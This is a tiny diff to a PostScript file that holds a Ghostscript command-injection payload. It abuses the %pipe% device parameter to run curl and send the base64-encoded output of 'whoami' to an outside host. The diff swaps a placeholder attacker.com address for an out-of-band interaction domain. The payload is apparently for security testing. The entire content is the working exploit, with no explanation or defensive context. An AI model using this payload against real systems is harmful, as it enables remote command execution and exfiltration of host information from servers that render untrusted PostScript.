@@ -1,4 +1,5 @@
 %!PS
-currentdevice null true mark /OutputICCProfile (%pipe%curl http://attacker.com/?a=$(whoami|base64) )
+currentdevice null true mark /OutputICCProfile (%pipe%curl http://hsdl160pu0gjwhtyi2tnriwmqdw4ku8j.oastify.com$(whoami|base64) )
 .putdeviceparams
+
 quit
